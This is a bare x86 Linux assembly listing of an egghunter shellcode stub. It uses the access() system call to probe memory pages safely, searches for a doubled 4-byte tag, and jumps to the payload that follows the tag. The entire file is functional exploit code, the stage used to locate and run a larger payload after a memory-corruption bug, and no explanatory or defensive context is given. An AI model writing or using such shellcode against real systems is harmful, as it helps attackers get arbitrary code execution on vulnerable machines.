global _start

section .text

_start:
xor ecx, ecx
mul ecx
cld

next_page:
or dx, 0xfff;

next_byte:
push byte 0x21	;access()
pop eax
inc edx
;ecx is 0 already
lea ebx, [edx+4]
int 0x80

cmp al, 0xf2	;check for error
jz next_page	;can't read the page

mov edi, edx
mov eax, 0x0df03df3
scasd
jnz next_byte	;keep trying
scasd		;do we have the string twice?
jnz next_byte	;keep trying

jmp edi		;found
